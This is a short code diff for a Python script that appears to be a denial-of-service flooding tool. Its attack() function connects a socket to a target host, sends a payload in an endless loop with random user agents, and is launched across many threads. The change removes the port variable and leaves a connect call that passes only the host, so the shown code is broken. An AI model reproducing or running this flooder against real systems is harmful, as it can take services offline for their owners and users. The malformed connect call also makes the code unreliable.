@@ -107,7 +107,7 @@ user_agents = [
 def attack():
     # Create a socket object with TCP protocol and connect to the target host and port
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((host, prox))
+    s.connect((host))
 
 # Generate a random user agent from the list and a random payload with the user agent
     user_agent = random.choice(user_agents)
@@ -117,7 +117,7 @@ def attack():
     while True:
         # Send the payload to the target and print a success message
         s.send(payload)
-        print(f"Sent request to {host}:{prox} with user agent {user_agent}")
+        print(f"Sent request to {host} with user agent {user_agent}")
 
 # Create a loop to launch threads for sending requests
 for i in range(threads):
